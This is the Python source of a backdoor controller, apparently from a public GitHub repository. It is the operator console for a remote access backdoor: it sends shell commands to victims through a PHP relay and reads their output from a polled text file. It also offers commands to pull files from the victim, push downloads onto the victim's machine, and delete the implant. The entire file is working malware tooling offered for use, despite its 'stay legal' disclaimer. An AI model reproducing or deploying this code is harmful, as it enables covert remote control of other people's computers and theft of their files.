'''

- Backdoor Controller coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- You can use this code, but please give credits.
- Have fun and stay legal!

'''

import requests, socket, sys, os, time


# color formatting
HEADER = '\033[95m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
RED = '\033[91m'
ENDC = '\033[0m'
BRIGHT = '\033[1m'
EBRIGHT = '\033[0m'


# help 

cHelp = WHITE+'''
Backdoor Extra Commands:

:exit                       Close connection to the backdoor.
:delete                     Definetly delete the backdoor from victim.
:download <url> <filename>  Download a file from a given url.
:get <filename>             Get a file from victim.
:help                       Show commands list.

'''

banner = WHITE + '''
 __________ 
< Backdoor >
 ---------- 
     \\
      \\ ''' + RED + ''' (__) ''' + WHITE + '''  Phoenix Backdoor Controller ''' + RED + ''' 
         (\\/)  
  /-------\\/ ''' + WHITE + '''   ]> Coded by'''+BLUE+''' Subn3t ''' + RED + ''' 
 / | 666 ||  ''' + WHITE + '''   ]> Version: ''' + RED + '''1.0.1 
*  ||----||  ''' + WHITE + '''   ]> Have fun and stay'''+YELLOW+''' Legal''' + RED + ''' 
   ~~    ~~         
                    
'''


def shell(server, xserver):
    # this is the main function
    
    try:
        # get the welcome from the backdoor
        # we got the ip,  the name and the current directory of the victim
        key, victimIp, victimName, victimDirectory = (requests.get(xserver).text).split('|#|')
    except ValueError:
        shell(server, xserver)

    while True:
        # this get the command 
        print(WHITE+'['+RED+BRIGHT+victimIp[1:]+WHITE+EBRIGHT+':'+RED+BRIGHT+victimName+WHITE+EBRIGHT+'] '+BRIGHT+BLUE+victimDirectory+EBRIGHT, end='\033[97m> ')
        command = input()
        
        if command == ':exit':
            # if the user wnat to close connection, send the command so also the backdoor close itself
            requests.post(server, data={'key':'','text':command})
            sys.exit()
        elif command == ':help':
            # print the help menu
            print(cHelp)
        else:
            # send the command and the key for attacker
            requests.post(server, data={'key':'','text':command})
            # wait for response
            output = requests.get(xserver, timeout=1).text
            while output[:3] == '$%&':
                output = requests.get(xserver, timeout=1).text
            print('\n'+WHITE+output) # print the output



if __name__ in "__main__":
    print(banner)
    xserver = '' # txt file url
    server = '' # php file url
    shell(server, xserver)
